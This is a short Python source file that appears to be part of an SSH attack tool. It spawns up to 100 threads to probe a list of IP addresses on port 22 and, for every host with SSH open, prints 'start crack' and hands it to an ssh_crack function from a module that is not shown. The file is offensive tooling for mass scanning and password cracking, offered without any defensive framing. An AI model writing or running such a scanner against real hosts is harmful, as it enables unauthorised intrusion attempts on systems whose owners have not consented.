import socket
import time
import threading
import ssh

threads = []
threadNum = 100

def scan(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        r = s.connect_ex((ip,22))
        if r == 0:
            print('host %s ssh is up, start crack.' % ip)
            ssh.ssh_crack(ip)
    except:
        print('err..')

def portScanner(ip):
    #scan port first
    for addr in ip:
        t = threading.Thread(target=scan,args=(addr,))
        threads.append(t)
    for t in threads:
        while threading.active_count() >= threadNum:
            time.sleep(0.1)
        t.start()
    for t in threads:
        t.join()

